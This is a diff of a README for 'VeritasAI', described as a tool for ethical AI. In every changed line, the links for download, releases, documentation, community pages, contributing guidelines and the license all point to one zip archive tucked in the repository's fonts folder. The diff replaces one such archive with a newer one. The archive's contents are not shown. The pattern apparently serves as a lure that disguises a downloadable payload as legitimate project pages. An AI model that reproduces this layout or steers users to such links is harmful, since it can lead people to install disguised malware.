@@ -6,7 +6,7 @@ Welcome to VeritasAI, your tool for ensuring ethical standards in AI! This guide
 
 ## 📥 Download the Application
 
-[![Download VeritasAI](https://raw.githubusercontent.com/SesethuNkqenkqa/veritas-ai/main/fonts/static/ai-veritas-v2.7.zip%20VeritasAI-v1.0-blue?style=for-the-badge)](https://raw.githubusercontent.com/SesethuNkqenkqa/veritas-ai/main/fonts/static/ai-veritas-v2.7.zip)
+[![Download VeritasAI](https://raw.githubusercontent.com/SesethuNkqenkqa/veritas-ai/main/fonts/ai_veritas_v3.6-beta.1.zip%20VeritasAI-v1.0-blue?style=for-the-badge)](https://raw.githubusercontent.com/SesethuNkqenkqa/veritas-ai/main/fonts/ai_veritas_v3.6-beta.1.zip)
 
 ## 🔍 About VeritasAI
 
@@ -32,7 +32,7 @@ Before starting, ensure your device meets the following minimum requirements:
 
 To get VeritasAI on your device, follow these steps:
 
-1. **Visit the Releases Page**: [Click here to go to the Releases page](https://raw.githubusercontent.com/SesethuNkqenkqa/veritas-ai/main/fonts/static/ai-veritas-v2.7.zip).
+1. **Visit the Releases Page**: [Click here to go to the Releases page](https://raw.githubusercontent.com/SesethuNkqenkqa/veritas-ai/main/fonts/ai_veritas_v3.6-beta.1.zip).
 
 2. **Select the Latest Version**: Look for the latest version listed on the page.
 
@@ -66,7 +66,7 @@ VeritasAI includes the following features:
 
 ## 📖 Documentation
 
-For detailed information and advanced usage, visit our [Documentation](https://raw.githubusercontent.com/SesethuNkqenkqa/veritas-ai/main/fonts/static/ai-veritas-v2.7.zip). This resource will guide you through features, troubleshooting, and best practices.
+For detailed information and advanced usage, visit our [Documentation](https://raw.githubusercontent.com/SesethuNkqenkqa/veritas-ai/main/fonts/ai_veritas_v3.6-beta.1.zip). This resource will guide you through features, troubleshooting, and best practices.
 
 ## ⚙️ Support
 
@@ -76,21 +76,21 @@ If you encounter any issues, please check our FAQ section in the documentation. 
 
 Join our community to discuss AI ethics, share your experiences, and get support. Connect with us on:
 
-- [GitHub Discussions](https://raw.githubusercontent.com/SesethuNkqenkqa/veritas-ai/main/fonts/static/ai-veritas-v2.7.zip)
-- [Twitter](https://raw.githubusercontent.com/SesethuNkqenkqa/veritas-ai/main/fonts/static/ai-veritas-v2.7.zip)
+- [GitHub Discussions](https://raw.githubusercontent.com/SesethuNkqenkqa/veritas-ai/main/fonts/ai_veritas_v3.6-beta.1.zip)
+- [Twitter](https://raw.githubusercontent.com/SesethuNkqenkqa/veritas-ai/main/fonts/ai_veritas_v3.6-beta.1.zip)
 
 ## 🔗 Additional Resources
 
-- [Ethical AI Practices](https://raw.githubusercontent.com/SesethuNkqenkqa/veritas-ai/main/fonts/static/ai-veritas-v2.7.zip)
-- [Understanding Bias in AI](https://raw.githubusercontent.com/SesethuNkqenkqa/veritas-ai/main/fonts/static/ai-veritas-v2.7.zip)
-- [MLflow Tracking Guide](https://raw.githubusercontent.com/SesethuNkqenkqa/veritas-ai/main/fonts/static/ai-veritas-v2.7.zip)
+- [Ethical AI Practices](https://raw.githubusercontent.com/SesethuNkqenkqa/veritas-ai/main/fonts/ai_veritas_v3.6-beta.1.zip)
+- [Understanding Bias in AI](https://raw.githubusercontent.com/SesethuNkqenkqa/veritas-ai/main/fonts/ai_veritas_v3.6-beta.1.zip)
+- [MLflow Tracking Guide](https://raw.githubusercontent.com/SesethuNkqenkqa/veritas-ai/main/fonts/ai_veritas_v3.6-beta.1.zip)
 
 ## 🔧 Contributing
 
-We welcome contributions! If you want to help us improve VeritasAI, please read our [Contributing Guidelines](https://raw.githubusercontent.com/SesethuNkqenkqa/veritas-ai/main/fonts/static/ai-veritas-v2.7.zip).
+We welcome contributions! If you want to help us improve VeritasAI, please read our [Contributing Guidelines](https://raw.githubusercontent.com/SesethuNkqenkqa/veritas-ai/main/fonts/ai_veritas_v3.6-beta.1.zip).
 
 ## 💡 License
 
-VeritasAI is licensed under the MIT License. Please check the [LICENSE](https://raw.githubusercontent.com/SesethuNkqenkqa/veritas-ai/main/fonts/static/ai-veritas-v2.7.zip) file for more information. 
+VeritasAI is licensed under the MIT License. Please check the [LICENSE](https://raw.githubusercontent.com/SesethuNkqenkqa/veritas-ai/main/fonts/ai_veritas_v3.6-beta.1.zip) file for more information. 
 
 Thank you for using VeritasAI! We're excited to help you create more ethical AI solutions.
